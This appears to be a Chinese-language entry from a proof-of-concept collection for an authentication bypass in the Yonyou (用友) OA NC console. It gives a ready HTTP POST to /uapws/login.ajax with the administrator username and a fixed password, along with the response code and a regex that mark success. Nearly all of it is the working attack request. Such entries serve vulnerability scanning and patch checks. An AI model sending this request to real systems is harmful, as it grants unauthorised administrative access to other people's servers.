﻿# 用友 OA nc 控制台绕过漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：用友 OA nc 控制台绕过漏洞

> 漏洞特征：

> 验证脚本：HTTP

```
POST /uapws/login.ajax HTTP/1.1

name=administrator&password=111111
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?(?:0|1)).*?$

> 上传文件定位：

> 验证文件来源：用友 OA nc 控制台绕过漏洞.poc
